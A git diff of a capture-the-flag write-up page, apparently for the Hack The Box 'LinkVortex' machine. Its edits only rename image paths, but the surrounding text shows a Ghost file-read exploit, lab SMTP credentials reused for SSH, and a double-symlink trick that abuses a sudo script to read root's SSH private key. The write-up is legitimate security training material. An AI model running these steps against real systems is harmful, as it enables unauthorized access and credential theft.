@@ -215,7 +215,7 @@ git clone https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nice we got a working exploit!
 
@@ -225,7 +225,7 @@ The Git repo had the `Dockerfile` for running the Ghost container. One thing it 
 /var/lib/ghost/config.production.json
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 At the bottom the SMTP setup has creds for bob@linkvortex.htb
 
@@ -237,7 +237,7 @@ bob@linkvortex.htb:fibber-talented-worth
 netexec ssh linkvortex.htb -u bob -p fibber-talented-worth
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 bob has SSH access
 
@@ -245,11 +245,11 @@ bob has SSH access
 ssh bob@linkvortex.htb
 ```
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## <mark style="color:blue;">Privilege Escalation</mark>
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 bob can run a bash script as the root user&#x20;
 
@@ -304,13 +304,13 @@ Otherwise, it moves the link file to the quarantine directory. If `CHECK_CONTENT
 
 The script gets the content of the link, and makes sure that the target of the link doesn’t have \[root] or \[etc] in it. What it doesn’t check is if that target is itself is also a symlink. So I can make something like
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This will pass the checks, and allow when it tries to `cat a.png`, it will print the ssh key
 
 It’s worth noting that [Protected Symlinks](https://sysctl-explorer.net/fs/protected_symlinks/) is enabled here \[as is the default on Ubuntu]:
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This means:
 
@@ -322,7 +322,7 @@ This protecting was developed specifically to address Time-of-Check to Time-of-U
 find / -type d -perm -0002 -perm -1000 2>/dev/null
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 To exploit this, I’ll create the link `b` from the diagram above
 
@@ -330,7 +330,7 @@ To exploit this, I’ll create the link `b` from the diagram above
 ln -s /root/.ssh/id_rsa /home/bob/.cache/b
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Next I’ll create `a.png`, another link pointing to `b`
 
@@ -338,7 +338,7 @@ Next I’ll create `a.png`, another link pointing to `b`
 ln -s /home/bob/.cache/b /home/bob/.cache/a.png
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now, with the environment variable to get contents set, I’ll check `a.png`
 
@@ -348,8 +348,8 @@ CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/a.png
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 It worked we got the root user's ssh key. I'll save it to my machine give it the correct permissions and use it to ssh as the root user
 
-<figure><img src="../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
